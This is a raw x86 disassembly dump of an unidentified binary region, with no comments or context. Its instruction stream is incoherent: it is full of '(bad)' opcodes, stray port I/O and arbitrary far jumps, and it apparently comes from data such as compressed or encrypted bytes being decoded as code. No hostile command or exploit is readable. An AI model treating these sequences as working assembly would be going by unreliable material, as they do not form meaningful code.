  41a92f:	xor    BYTE PTR [eax],ch
  41a931:	jmp    0x41a981
  41a933:	mov    bl,0x54
  41a935:	sbb    DWORD PTR [esi],esi
  41a937:	and    BYTE PTR [ebp-0xe],dh
  41a93a:	sbb    ah,BYTE PTR [edi]
  41a93c:	repnz push es
  41a93e:	shl    esp,0x4b
  41a941:	(bad)  
  41a942:	xchg   esi,eax
  41a943:	addr16 icebp 
  41a945:	xchg   BYTE PTR [edx+0x5d871132],bl
  41a94b:	in     eax,dx
  41a94c:	push   ebx
  41a94d:	jl     0x41a9c3
  41a94f:	fs dec ebp
  41a951:	adc    eax,0x574cb78
  41a956:	test   al,0x2b
  41a958:	popf   
  41a959:	bound  esi,QWORD PTR [edi+0xd]
  41a95c:	(bad)  
  41a95d:	jb     0x41a9d9
  41a95f:	jo     0x41a962
  41a961:	push   edi
  41a962:	enter  0xec45,0x18
  41a966:	sub    BYTE PTR [eax+0x2c99c989],al
  41a96c:	fs ins DWORD PTR es:[edi],dx
  41a96e:	into   
  41a96f:	cld    
  41a970:	jmp    0x41a8f6
  41a972:	aam    0xf0
  41a974:	inc    edx
  41a975:	in     eax,dx
  41a976:	scas   al,BYTE PTR es:[edi]
  41a977:	sbb    eax,0xdee9f3fa
  41a97c:	mov    BYTE PTR [eax],al
  41a97e:	(bad)  
  41a97f:	mov    ecx,0x8605af0c
  41a984:	dec    ebx
  41a985:	icebp  
  41a986:	out    0x35,al
  41a988:	inc    ebp
  41a989:	mov    ds:0xc552938b,al
  41a98e:	mov    ebp,0xc6470363
  41a993:	(bad)  
  41a994:	dec    eax
  41a995:	mov    edi,0xc1b803f3
  41a99a:	pop    edx
  41a99b:	dec    BYTE PTR [edx+0x205aa259]
  41a9a1:	loopne 0x41a9f1
  41a9a3:	repz jb 0x41aa08
  41a9a6:	jg     0x41a93f
  41a9a8:	mov    dh,0x63
  41a9aa:	jnp    0x41a9f2
  41a9ac:	sub    ch,dh
  41a9ae:	inc    edx
  41a9af:	mov    dl,0x10
  41a9b1:	ins    DWORD PTR es:[edi],dx
  41a9b2:	(bad)  
  41a9b3:	ins    BYTE PTR es:[edi],dx
  41a9b4:	lahf   
  41a9b5:	into   
  41a9b6:	add    eax,0x16ad806c
  41a9bb:	aad    0x4b
  41a9bd:	retf   
  41a9be:	leave  
  41a9bf:	cmp    BYTE PTR [edi-0x27],0x7f
  41a9c3:	cmc    
  41a9c4:	lock mov ecx,0xaf8448a9
  41a9ca:	mov    ?,WORD PTR [ebp-0x18]
  41a9cd:	mov    ecx,0x85cdbe73
  41a9d2:	add    al,0xd3
  41a9d4:	xlat   BYTE PTR ds:[ebx]
  41a9d5:	and    eax,0xb3f8621b
  41a9da:	pop    edi
  41a9db:	retf   0x7224
  41a9de:	loope  0x41aa4a
  41a9e0:	leave  
  41a9e1:	jmp    0x68fa:0xc682f152
  41a9e8:	add    al,0x23
  41a9ea:	or     al,0x2e
  41a9ec:	(bad)  
  41a9ed:	pop    esi
  41a9ee:	sbb    ch,al
  41a9f0:	ss (bad) 
  41a9f2:	fstp   TBYTE PTR [edx]
  41a9f4:	fwait
  41a9f5:	dec    ecx
  41a9f6:	cli    
  41a9f7:	jae    0x41aa1e
  41a9f9:	and    BYTE PTR [edi+0x50ca79b1],al
  41a9ff:	adc    eax,0xb97d8fa2
  41aa04:	sahf   
  41aa05:	cdq    
  41aa06:	mov    bl,0xb5
  41aa08:	mov    esi,0xf1dcf821
  41aa0d:	(bad)  
  41aa0e:	mov    ds:0xbe2e0c37,eax
  41aa13:	fistp  QWORD PTR [eax]
  41aa15:	ficom  DWORD PTR [edx+0x33]
  41aa18:	aad    0x1a
  41aa1a:	xchg   esp,eax
  41aa1b:	dec    ecx
  41aa1c:	test   al,0xe0
  41aa1e:	outs   dx,DWORD PTR ds:[esi]
  41aa1f:	inc    BYTE PTR [esi-0x3d324fa5]
  41aa25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa26:	stos   DWORD PTR es:[edi],eax
  41aa27:	inc    edx
  41aa28:	mov    eax,ds:0x68b44381
  41aa2d:	pop    esi
  41aa2e:	push   ecx
  41aa2f:	cli    
  41aa30:	mov    dh,0xb
  41aa32:	inc    ebp
  41aa33:	out    dx,al
  41aa34:	pop    eax
	...
  41aa95:	add    bh,dh
  41aa97:	add    esp,ebx
  41aa99:	mov    ah,0xfe
  41aa9b:	std    
  41aa9c:	inc    DWORD PTR [ebx-0x4b]
  41aa9f:	mov    ds:0x2880e277,al
  41aaa4:	rcr    DWORD PTR [ebx],1
  41aaa6:	in     eax,0x18
  41aaa8:	add    DWORD PTR [eax],eax
  41aaaa:	pop    es
  41aaab:	add    DWORD PTR [eax],eax
  41aaad:	add    BYTE PTR [esi+0x15d5868a],dh
  41aab3:	loop   0x41aa5d
  41aab5:	adc    BYTE PTR cs:[ebx-0x66],bh
  41aab9:	add    al,0xd0
  41aabb:	or     al,0xa5
  41aabd:	cmp    ah,0xc4
  41aac0:	mov    edx,esp
  41aac2:	push   ebp
  41aac3:	cmp    ecx,DWORD PTR [ecx]
  41aac5:	mov    ds:0x88219fe8,eax
  41aaca:	mov    esi,0xbefe3a7b
  41aacf:	dec    eax
  41aad0:	ins    DWORD PTR es:[edi],dx
  41aad1:	mov    esp,DWORD PTR [ebp+0x1c]
  41aad4:	cmp    al,0x4e
  41aad6:	xchg   esi,eax
  41aad7:	adc    dh,ch
  41aad9:	pusha  
  41aada:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aadb:	out    0x27,al
  41aadd:	inc    ebp
  41aade:	pop    esp
  41aadf:	dec    edi
  41aae0:	and    ecx,edx
  41aae2:	icebp  
  41aae3:	mov    dl,0xa3
  41aae5:	sub    DWORD PTR [edi+0x32e90252],ebp
  41aaeb:	jb     0x41aa99
  41aaed:	adc    bh,dh
  41aaef:	test   eax,0xb8dfb26b
  41aaf4:	pop    esi
  41aaf5:	sub    eax,0x9e9475ea
  41aafa:	stos   DWORD PTR es:[edi],eax
  41aafb:	mov    dh,0x53
  41aafd:	jmp    0x41aa90
  41aaff:	int    0xf8
  41ab01:	pop    es
  41ab02:	xor    esp,edi
  41ab04:	xor    eax,0x6122a791
  41ab09:	inc    ebx
  41ab0a:	jmp    FWORD PTR [ebp+0x69518b58]
  41ab10:	push   ecx
  41ab11:	add    BYTE PTR [ebx+0x22],ch
  41ab14:	rcl    DWORD PTR [edx-0x19b7c5d2],0x41
  41ab1b:	inc    edi
  41ab1c:	inc    ecx
  41ab1d:	stos   DWORD PTR es:[edi],eax
  41ab1e:	fist   DWORD PTR [esi-0x68]
  41ab21:	mov    ah,0x67
  41ab23:	dec    ebp
  41ab24:	imul   edi,DWORD PTR [ebp-0x47db4dcd],0x7e97270b
  41ab2e:	(bad)  
  41ab2f:	adc    BYTE PTR [edx-0x59eab23f],ah
  41ab35:	imul   ebx,DWORD PTR [eax+ebp*2+0x5f],0x83707e31
  41ab3d:	mov    ah,0x4f
  41ab3f:	out    0xab,al
  41ab41:	je     0x41ab0a
  41ab43:	and    ch,BYTE PTR [edx-0x67]
  41ab46:	xlat   BYTE PTR ds:[ebx]
  41ab47:	mov    bl,0x3e
  41ab49:	fldcw  WORD PTR [eax]
  41ab4b:	push   0x830354bf
  41ab50:	sub    al,0x4b
  41ab52:	xor    edi,DWORD PTR [bp+di+0x4109]
  41ab57:	mov    ds:0x153dcfbc,al
  41ab5c:	and    ebp,esp
  41ab5e:	cmp    esp,DWORD PTR [ebp+0x2927ac3d]
  41ab64:	test   eax,0xf53ebcbe
  41ab69:	(bad)  
  41ab6a:	je     0x41ab00
  41ab6c:	mov    cl,0x41
  41ab6e:	xchg   esp,eax
  41ab6f:	fcomp  QWORD PTR [ebx+0x4b]
  41ab72:	sub    ebp,ebx
  41ab74:	iret   
  41ab75:	mov    ebx,DWORD PTR [eax-0xfc33d49]
  41ab7b:	sbb    ebx,DWORD PTR [ebx+edx*1+0xf51d1e4]
  41ab82:	or     BYTE PTR ds:0xe9b8b8a6,ch
  41ab88:	push   esp
  41ab89:	scas   al,BYTE PTR es:[edi]
  41ab8a:	mov    ah,0x8d
  41ab8c:	mov    edx,0xa29f9d1a
  41ab91:	std    
  41ab92:	mov    ebp,0x6cdbb19d
  41ab97:	push   0xcb506b08
  41ab9c:	outs   dx,DWORD PTR ds:[esi]
  41ab9d:	mov    edi,0xf56b4361
  41aba2:	(bad)
  41aba7:	mov    BYTE PTR [ebx-0x11],bh
  41abaa:	arpl   WORD PTR [ecx+0x47],si
  41abad:	stos   BYTE PTR es:[edi],al
  41abae:	adc    dl,BYTE PTR [edx+0x6d]
  41abb1:	scas   eax,DWORD PTR es:[edi]
  41abb2:	test   DWORD PTR [ecx+0x46],esi
	...
  41ac14:	add    BYTE PTR [eax],al
  41ac16:	push   0x49
  41ac18:	es cmp al,0x27
  41ac1b:	jg     0x41ac97
  41ac1d:	pop    edi
  41ac1e:	pop    esp
  41ac1f:	mov    edx,0xb1a3cc53
  41ac24:	fmul   DWORD PTR ds:0x119ec
  41ac2a:	pop    es
  41ac2b:	add    DWORD PTR [eax],eax
  41ac2d:	add    BYTE PTR [edi-0x25],ah
  41ac30:	lahf   
  41ac31:	test   al,0xc0
  41ac33:	sbb    DWORD PTR [edx-0x5fdd096e],edx
  41ac39:	push   es
  41ac3a:	mov    bl,0x34
  41ac3c:	scas   al,BYTE PTR es:[edi]
  41ac3d:	jecxz  0x41ac17
  41ac3f:	and    al,0x4e
  41ac41:	jmp    0x41ac35
  41ac43:	xor    DWORD PTR [esi+0x6d],ebx
  41ac46:	das    
  41ac47:	xlat   BYTE PTR ds:[ebx]
  41ac48:	mov    ch,0x96
  41ac4a:	xchg   edi,eax
  41ac4b:	mov    ebx,0xbf59907a
  41ac50:	xor    DWORD PTR fs:[esi],edx
  41ac53:	and    eax,0x949c0b6a
  41ac58:	dec    esi
  41ac59:	or     DWORD PTR ds:0x182d488b,esi
  41ac5f:	pop    edx
  41ac60:	sub    dl,0x0
  41ac63:	out    dx,al
  41ac64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac65:	jo     0x41ac5c
  41ac67:	push   cs
  41ac68:	mov    ch,0xda
  41ac6a:	hlt    
  41ac6b:	loope  0x41acc6
  41ac6d:	xor    eax,0x4489da46
  41ac72:	lds    edi,FWORD PTR ds:0x9ddd8edb
  41ac78:	hlt    
  41ac79:	xor    edi,DWORD PTR [ebp-0x3f]
  41ac7c:	pop    ecx
  41ac7d:	fisttp QWORD PTR [edi-0x14]
  41ac80:	sub    eax,0xe787e89b
  41ac85:	mov    esp,0x3de98988
  41ac8a:	lods   eax,DWORD PTR ds:[esi]
  41ac8b:	inc    ebp
  41ac8c:	in     eax,dx
  41ac8d:	popa   
  41ac8e:	push   es
  41ac8f:	fnsave [ebx-0x77]
  41ac92:	mov    edi,0xfbccfd81
  41ac97:	inc    ebp
  41ac98:	dec    esi
  41ac99:	or     BYTE PTR [eax+0x7052a657],bh
  41ac9f:	jle    0x41ac28
  41aca1:	popf   
  41aca2:	and    eax,0xc8dd8d69
  41aca7:	mov    bh,0x55
  41aca9:	push   eax
  41acaa:	jge    0x41ac67
  41acac:	push   ebx
  41acad:	ror    edx,cl
  41acaf:	mov    dl,0x5e
  41acb1:	fcomp  DWORD PTR [ebx+0x7c]
  41acb4:	xlat   BYTE PTR ds:[ebx]
  41acb5:	push   esp
  41acb6:	repz hlt 
  41acb8:	push   esi
  41acb9:	cmp    eax,0x20bae41b
  41acbe:	cmp    BYTE PTR [ecx+0x291c19a0],cl
  41acc4:	test   bl,dl
  41acc6:	cmp    al,0x68
  41acc8:	inc    ecx
  41acc9:	adc    DWORD PTR [ebx-0x43],esp
  41accc:	mov    dh,0xf3
  41acce:	es cdq 
  41acd0:	or     eax,0x3da2104f
  41acd5:	ret    
  41acd6:	loope  0x41ac7d
  41acd8:	sti    
  41acd9:	cmp    bl,BYTE PTR [esi-0x58]
  41acdc:	arpl   WORD PTR [ebp+ebx*8-0x7e],di
  41ace0:	adc    al,0x87
  41ace2:	adc    eax,0x623377f0
  41ace7:	cmp    eax,0x4f82f032
  41acec:	bound  ecx,QWORD PTR [esi]
  41acee:	loopne 0x41acf9
  41acf0:	jbe    0x41acf1
  41acf2:	dec    eax
  41acf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acf4:	mov    DWORD PTR [eax],edx
  41acf6:	pop    es
  41acf7:	mov    es,WORD PTR [esi]
  41acf9:	shr    DWORD PTR [edi+ebp*1],0x75
  41acfd:	xchg   esp,eax
  41acff:	das    
  41ad00:	call   0x1b668c5
  41ad05:	push   ebp
  41ad06:	pop    esi
  41ad07:	push   eax
  41ad08:	pop    esp
  41ad09:	xchg   esp,eax
  41ad0a:	pop    edx
  41ad0b:	jns    0x41ac91
  41ad0d:	imul   ecx,DWORD PTR [eax+0x1d72945e],0x64ce6518
  41ad17:	or     BYTE PTR [edi-0x2e],dl
  41ad1a:	mov    WORD PTR [edx+ebx*1+0x6e],fs
  41ad1e:	ins    DWORD PTR es:[edi],dx
  41ad1f:	cmp    DWORD PTR [edx+0x45],0x754077b
  41ad26:	xor    eax,0x4170675d
  41ad2b:	mov    ecx,DWORD PTR ds:0x745e7f4b
  41ad31:	fcmovbe st,st(6)
  41ad33:	leave  
  41ad34:	out    dx,al
	...
  41ad95:	add    BYTE PTR [ebp-0x8],dl
  41ad98:	or     DWORD PTR [esi-0x4280053],ebx
  41ad9e:	mov    dh,BYTE PTR [eax+eax*4]
  41ada1:	add    edx,DWORD PTR [eax-0xc6f742a]
  41ada7:	sbb    al,BYTE PTR [ecx]
  41ada9:	add    BYTE PTR [edi],al
  41adab:	add    DWORD PTR [eax],eax
  41adad:	add    BYTE PTR [ebp+0x5f27c63b],cl
  41adb3:	jge    0x41ad37
  41adb5:	dec    ebx
  41adb6:	or     eax,0xa1b27e13
  41adbb:	ss js  0x41ae0b
  41adbe:	pushf  
  41adbf:	int3   
  41adc0:	add    eax,0x5e2b8b92
  41adc5:	cmp    al,0xbb
  41adc7:	sbb    edx,DWORD PTR [esi]
  41adc9:	add    al,0x52
  41adcb:	mov    al,0x48
  41adcd:	dec    esi
  41adce:	mov    ah,0x95
  41add0:	cwde   
  41add1:	xchg   ebx,eax
  41add2:	or     edx,DWORD PTR [ebp-0x34]
  41add5:	mov    dl,0x70
  41add7:	lods   eax,DWORD PTR ds:[esi]
  41add8:	dec    esi
  41add9:	push   0x4b
  41addb:	or     bh,al
  41addd:	jg     0x41ae32
  41addf:	pmulhw mm7,mm7
  41ade2:	sar    DWORD PTR [eax-0x7486a8fc],cl
  41ade8:	fldcw  WORD PTR [esi+eax*2]
  41adeb:	stc    
  41adec:	push   ecx
  41aded:	mov    esp,0x75264f6d
  41adf2:	(bad)  
  41adf3:	mov    ds:0x4d5ea82e,al
  41adf8:	(bad)  
  41adf9:	pop    ebx
  41adfa:	push   edi
  41adfb:	and    bl,BYTE PTR [eax+edx*1-0x42]
  41adff:	jo     0x41ae2b
  41ae01:	adc    DWORD PTR [eax-0x67],edx
  41ae04:	rcr    ebx,0x7
  41ae07:	jnp    0x41ae2b
  41ae09:	jp     0x41ae86
  41ae0b:	pop    eax
  41ae0c:	neg    BYTE PTR [ecx+0x27879e74]
  41ae12:	lea    edx,[ebx-0x59231f8d]
  41ae18:	and    eax,0xa11ba65b
  41ae1d:	lock sbb bh,0x7
  41ae21:	jmp    0x9929:0x3d16af
  41ae28:	loop   0x41ae30
  41ae2a:	shr    DWORD PTR [ecx-0x21d836ec],0x2c
  41ae31:	pop    eax
  41ae32:	jae    0x41ae3e
  41ae34:	xor    eax,0x583f56bd
  41ae39:	imul   edi,ecx,0xffffff96
  41ae3c:	push   ebx
  41ae3d:	out    0xa0,al
  41ae3f:	mov    al,ds:0x4aa3b0f6
  41ae44:	sub    eax,0xd46bbcec
  41ae49:	dec    eax
  41ae4a:	mov    gs,WORD PTR [esi+0x7f]
  41ae4d:	pop    esi
  41ae4e:	cmp    bh,0xaa
  41ae51:	pop    edx
  41ae52:	push   cs
  41ae53:	inc    edx
  41ae54:	jns    0x41aeba
  41ae56:	jp     0x41ae7e
  41ae58:	ins    DWORD PTR es:[edi],dx
  41ae59:	repz call 0x8eb3:0x3785a9d4
  41ae61:	ja     0x41ae04
  41ae63:	popf   
  41ae64:	or     esp,ecx
  41ae66:	mov    dl,0x81
  41ae68:	clc    
  41ae69:	jl     0x41aecc
  41ae6b:	je     0x41ae52
  41ae6d:	or     edx,edx
  41ae6f:	test   BYTE PTR [eax],0xf1
  41ae72:	push   es
  41ae73:	push   eax
  41ae74:	loopne 0x41ae33
  41ae76:	mov    fs,ebp
  41ae78:	arpl   WORD PTR [edx-0x50],si
  41ae7b:	inc    eax
  41ae7c:	enter  0x6e17,0x6f
  41ae80:	loopne 0x41aef4
  41ae82:	ja     0x41ae57
  41ae84:	xchg   ebp,eax
  41ae85:	mov    BYTE PTR [ecx-0x46],0xe5
  41ae89:	das    
  41ae8a:	or     BYTE PTR [edx-0x3e23e413],dh
  41ae90:	fst    DWORD PTR [eax+0x37]
  41ae93:	loopne 0x41af0f
  41ae95:	xchg   edx,eax
  41ae96:	add    dl,BYTE PTR [ecx+0x215c9156]
  41ae9c:	jmp    0xb6ccf165
  41aea1:	neg    BYTE PTR [ebx-0x74]
  41aea4:	repz dec ecx
  41aea6:	xchg   esp,eax
  41aea7:	sbb    bl,BYTE PTR [edx]
  41aea9:	xchg   BYTE PTR [esi+0x2d1ea3c1],bl
  41aeaf:	push   edx
  41aeb0:	iret   
  41aeb1:	pop    esi
  41aeb2:	hlt    
  41aeb3:	xchg   esp,eax
  41aeb4:	cmp    eax,0x0
	...
  41af15:	add    ch,al
  41af17:	stc    
  41af18:	lods   eax,DWORD PTR ds:[esi]
  41af19:	xor    edi,DWORD PTR [ebp+0x56ffdf77]
  41af1f:	xor    al,0x39
  41af21:	loop   0x41af2b
  41af23:	enter  0x47,0xfa
  41af27:	sbb    eax,DWORD PTR [ecx]
  41af29:	add    BYTE PTR [edi],al
  41af2b:	add    DWORD PTR [eax],eax
  41af2d:	add    al,bl
  41af2f:	arpl   WORD PTR [edi-0x2b22ed85],bx
  41af35:	scas   al,BYTE PTR es:[edi]
  41af36:	fstp   QWORD PTR [ebx+ebx*8+0x13]
  41af3a:	jge    0x41af29
  41af3c:	mov    edi,0x5ba46a02
  41af41:	ret    0x1e60
  41af44:	je     0x41aeee
  41af46:	mov    dl,0x5e
  41af48:	nop
  41af49:	lahf   
  41af4a:	sub    eax,0xcc8394dc
  41af4f:	cmp    DWORD PTR [ebp-0x4f134ff4],edi
  41af55:	fwait
  41af56:	mov    al,ds:0xef80397c
  41af5b:	pop    eax
  41af5c:	xor    eax,0x6b3a0b4c
  41af61:	rcl    edx,cl
  41af63:	outs   dx,DWORD PTR ds:[esi]
  41af64:	push   ebx
  41af65:	popf   
  41af66:	int    0xa8
  41af68:	mov    WORD PTR [ecx+0x281d45],gs
  41af6e:	jle    0x41afde
  41af70:	ret    0x70a1
  41af73:	fmul   DWORD PTR [ebx-0x3fb2e2df]
  41af79:	ret    0x7ba1
  41af7c:	mov    esp,DWORD PTR [edi]
  41af7e:	mov    ebx,0x1a5ce030
  41af83:	xor    ebx,DWORD PTR [edx-0x43]
  41af86:	mov    cl,0x56
  41af88:	mov    edi,0xe4364cd6
  41af8d:	jecxz  0x41af20
  41af8f:	stos   DWORD PTR es:[edi],eax
  41af90:	xor    esi,DWORD PTR [esp-0x6d]
  41af94:	jecxz  0x41af5b
  41af96:	dec    edx
  41af97:	in     eax,dx
  41af98:	ins    DWORD PTR es:[edi],dx
  41af99:	xchg   esp,eax
  41af9a:	jb     0x41afc1
  41af9c:	jp     0x41afb9
  41af9e:	shl    DWORD PTR [edx],cl
  41afa0:	pop    ebx
  41afa1:	push   0x89755839
  41afa6:	jecxz  0x41af6d
  41afa8:	jbe    0x41afbd
  41afaa:	push   ebp
  41afab:	retf   0xd6dc
  41afae:	jno    0x41b01f
  41afb0:	pop    edx
  41afb1:	xor    al,0x22
  41afb3:	dec    edi
  41afb4:	aaa    
  41afb5:	in     eax,0x33
  41afb7:	(bad)  
  41afb9:	stos   BYTE PTR es:[edi],al
  41afba:	mov    DWORD PTR [ebp-0x1b],edx
  41afbd:	push   ebx
  41afbe:	sub    eax,0x379479e8
  41afc3:	push   0xb95e44ef
  41afc8:	mov    ds:0x9d31130c,al
  41afcd:	mov    edi,0x1dece561
  41afd2:	mov    cl,0x36
  41afd4:	push   es
  41afd5:	mov    ss,WORD PTR [edx-0x58cc8d53]
  41afdb:	ins    BYTE PTR es:[edi],dx
  41afdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afdd:	(bad)  
  41afde:	and    ebx,DWORD PTR [edx+0x78]
  41afe1:	mov    dh,BYTE PTR [edx-0x447b0598]
  41afe7:	leave  
  41afe8:	test   BYTE PTR [bp+di+0x490e],ch
  41afed:	jge    0x41af98
  41afef:	adc    DWORD PTR [edx],ecx
  41aff1:	leave  
  41aff2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aff3:	xlat   BYTE PTR cs:[ebx]
  41aff5:	and    DWORD PTR [edi+eax*8+0x11f47686],ebx
  41affc:	(bad)  
  41affd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41affe:	fs inc edi
  41b000:	ins    DWORD PTR es:[edi],dx
  41b001:	xchg   BYTE PTR [ebx+0x51],al
  41b004:	les    ecx,FWORD PTR [edx-0x7ca7d826]
  41b00a:	loope  0x41b06b
  41b00c:	adc    DWORD PTR [edi-0x3a278b5f],esp
  41b012:	stos   BYTE PTR es:[edi],al
  41b013:	into   
  41b014:	das    
  41b015:	add    DWORD PTR [esi+eax*2],eax
  41b018:	(bad)  
  41b019:	jecxz  0x41b097
  41b01b:	fidivr DWORD PTR [edi+0x58]
  41b01e:	cdq    
  41b01f:	mov    ecx,0x57819c0d
  41b024:	mov    dh,0x70
  41b026:	fdiv   DWORD PTR [ebx]
  41b028:	dec    ebp
  41b029:	fdivr  DWORD PTR [edi+ebp*4]
  41b02c:	and    esi,DWORD PTR [esi+0x61]
  41b02f:	in     eax,0x22
  41b031:	pop    es
  41b032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b033:	ins    BYTE PTR es:[edi],dx
  41b034:	sub    DWORD PTR [eax],eax
	...
  41b096:	(bad)  
  41b097:	ficom  WORD PTR [eax]
  41b099:	stos   DWORD PTR es:[edi],eax
  41b09a:	sbb    bh,ch
  41b09c:	(bad)  
  41b09d:	jmp    DWORD PTR [eax]
  41b09f:	jmp    FWORD PTR [esi-0x1eb1e5cf]
  41b0a5:	inc    edx
  41b0a6:	add    DWORD PTR ds:0x1070001,ebx
  41b0ac:	add    BYTE PTR [eax],al
  41b0ae:	or     BYTE PTR [esi],ah
  41b0b0:	fcmove st,st(2)
  41b0b2:	das    
  41b0b3:	mov    DWORD PTR [esi],edx
  41b0b5:	out    0x5c,eax
  41b0b7:	mov    bh,0xd2
  41b0b9:	push   ss
  41b0ba:	push   ss
  41b0bb:	cs mov ebx,0x22c8806
  41b0c1:	push   0xffffffb5
  41b0c3:	call   FWORD PTR [edi]
  41b0c5:	xchg   ebx,eax
  41b0c6:	test   eax,0x14a1e967
  41b0cb:	lock sbb ah,BYTE PTR [edi+0x6a]
  41b0cf:	xchg   ebx,eax
  41b0d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0d1:	xor    DWORD PTR [eax],0x43
  41b0d4:	add    cl,bh
  41b0d6:	imul   esp,DWORD PTR [esi+edx*4+0x3a],0xffffff84
  41b0db:	stos   BYTE PTR es:[edi],al
  41b0dc:	enter  0xc169,0xac
  41b0e0:	call   0xd99e:0xff8c6f57
  41b0e7:	inc    edx
  41b0e8:	jl     0x41b0bc
  41b0ea:	adc    DWORD PTR [ebx+0x33],edx
  41b0ed:	in     eax,dx
  41b0ee:	mov    eax,0x1c655c4c
  41b0f3:	add    al,0xfd
  41b0f5:	(bad)  
  41b0f6:	jno    0x41b0b0
  41b0f8:	xchg   esp,eax
  41b0f9:	js     0x41b091
  41b0fb:	dec    edi
  41b0fc:	fnsave [ebp-0x5d]
  41b0ff:	add    BYTE PTR [ecx],ch
  41b101:	or     eax,0x7b908c0e
  41b106:	adc    dh,bh
  41b108:	ja     0x41b0e1
  41b10a:	add    eax,0xfa05de8f
  41b10f:	int    0xcc
  41b111:	rcr    ebx,0x7c
  41b114:	add    BYTE PTR [eax+0x38b11dd0],bl
  41b11a:	mov    dh,0xd0
  41b11c:	enter  0x9bb3,0x65
  41b120:	mov    dl,0x50
  41b122:	lock shr BYTE PTR [eax+0x3f687a46],cl
  41b129:	sub    ebx,esi
  41b12b:	push   ecx
  41b12c:	inc    edi
  41b12d:	test   DWORD PTR [ecx+0x57e39953],0xdb341299
  41b137:	ret    
  41b138:	jae    0x41b152
  41b13a:	jae    0x41b1b7
  41b13c:	mov    ecx,0x8a4ed11
  41b141:	jecxz  0x41b0df
  41b143:	mov    al,ds:0x16723e2c
  41b148:	lods   eax,DWORD PTR ds:[esi]
  41b149:	sbb    al,0xc
  41b14b:	push   ebp
  41b14c:	or     ah,BYTE PTR [ebp+0x3e]
  41b14f:	pop    es
  41b150:	pusha  
  41b151:	addr16 cdq 
  41b153:	mov    al,0x4e
  41b155:	fst    QWORD PTR [edi-0x79]
  41b158:	mov    al,0x5
  41b15a:	aam    0x7f
  41b15c:	adc    al,BYTE PTR [edi-0x2e157980]
  41b162:	pushf  
  41b163:	lahf   
  41b164:	mov    BYTE PTR [eax],bh
  41b166:	adc    ecx,DWORD PTR [edx+0x6a785d52]
  41b16c:	jns    0x41b1a2
  41b16e:	and    dl,bh
  41b170:	ficomp WORD PTR [ebx]
  41b172:	(bad)  
  41b174:	mov    al,ds:0xa5e4a2a0
  41b179:	add    al,0x56
  41b17b:	gs push 0xb6f46f03
  41b181:	adc    ah,cl
  41b183:	scas   eax,DWORD PTR es:[edi]
  41b184:	mov    WORD PTR [edi+ebp*8+0x54],ds
  41b188:	test   BYTE PTR [edi-0x5474df9],ah
  41b18e:	ss pop edi
  41b190:	aad    0x21
  41b192:	add    al,0xe5
  41b194:	mov    ds:0xf14eb50c,eax
  41b199:	imul   eax,edi,0x3790015f
  41b19f:	outs   dx,DWORD PTR ds:[esi]
  41b1a0:	imul   edi,DWORD PTR [eax+edi*2],0x60
  41b1a4:	and    eax,DWORD PTR [edx+esi*2]
  41b1a7:	cwde   
  41b1a8:	mov    ds:0x8e84fd5c,eax
  41b1ad:	stos   DWORD PTR es:[edi],eax
  41b1ae:	xchg   ecx,eax
  41b1af:	sbb    al,0x21
  41b1b1:	xor    al,0x54
  41b1b3:	xchg   edx,eax
  41b1b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  41b215:	add    BYTE PTR [esi+0x6be069a5],cl
  41b21b:	in     al,dx
  41b21c:	(bad)  
  41b21d:	out    dx,eax
  41b21e:	arpl   WORD PTR [edi-0x53],sp
  41b221:	aas    
  41b222:	scas   al,BYTE PTR es:[edi]
  41b223:	adc    al,BYTE PTR [ecx]
  41b225:	hlt    
  41b226:	or     BYTE PTR [esi],bl
  41b228:	add    DWORD PTR [eax],eax
  41b22a:	pop    es
  41b22b:	add    DWORD PTR [eax],eax
  41b22d:	add    BYTE PTR [ebx-0x24],al
  41b230:	inc    DWORD PTR [edi]
  41b232:	and    dl,bl
  41b234:	dec    edx
  41b235:	es pop ebx
  41b237:	sbb    bl,BYTE PTR [ebp+eax*1+0x79]
  41b23b:	jmp    FWORD PTR [ebx]
  41b23d:	pop    esp
  41b23e:	pop    edi
  41b23f:	fs cli 
  41b241:	hlt    
  41b242:	inc    edi
  41b243:	retf   
  41b244:	int    0x4f
  41b246:	push   edx
  41b247:	test   ebx,edi
  41b249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b24a:	dec    eax
  41b24b:	xor    al,0xb6
  41b24d:	bound  esp,QWORD PTR [esp+0x599f23c6]
  41b254:	xchg   esp,eax
  41b255:	loop   0x41b294
  41b257:	mov    ebx,0x58768bad
  41b25c:	sub    BYTE PTR ds:0x9c5b60bd,0x91
  41b263:	inc    ebx
  41b264:	aaa    
  41b265:	sub    ebp,ecx
  41b267:	xchg   ebp,eax
  41b268:	es push edx
  41b26a:	xor    ebx,ebx
  41b26c:	cwde   
  41b26d:	repz ret 
  41b26f:	popa   
  41b270:	scas   eax,DWORD PTR es:[edi]
  41b271:	and    al,0xa4
  41b273:	lea    esp,[ebx+edx*8+0x779cd4fd]
  41b27a:	icebp  
  41b27b:	mov    ah,0x47
  41b27d:	outs   dx,DWORD PTR ds:[esi]
  41b27e:	mov    edx,0x367d686a
  41b283:	stos   BYTE PTR es:[edi],al
  41b284:	(bad)  
  41b285:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b286:	add    BYTE PTR ds:0xdb4d80a8,ch
  41b28c:	mov    ds:0xba20582b,al
  41b291:	pop    eax
  41b292:	scas   al,BYTE PTR es:[edi]
  41b293:	loop   0x41b244
  41b295:	xor    al,0xcf
  41b297:	mov    ds,edx
  41b299:	(bad)  
  41b29a:	repz dec esp
  41b29c:	stc    
  41b29d:	ror    DWORD PTR [edx],1
  41b29f:	cmp    BYTE PTR [edx],cl
  41b2a1:	jg     0x41b2dd
  41b2a3:	call   0x97b3:0x6fb9a9a7
  41b2aa:	cmp    eax,0x3fb26b76
  41b2af:	in     al,0x8
  41b2b1:	es push ds
  41b2b3:	push   ebx
  41b2b4:	sub    eax,0xe95995e2
  41b2b9:	dec    esp
  41b2ba:	imul   ebp,DWORD PTR [eax+0x1c],0x168fcd45
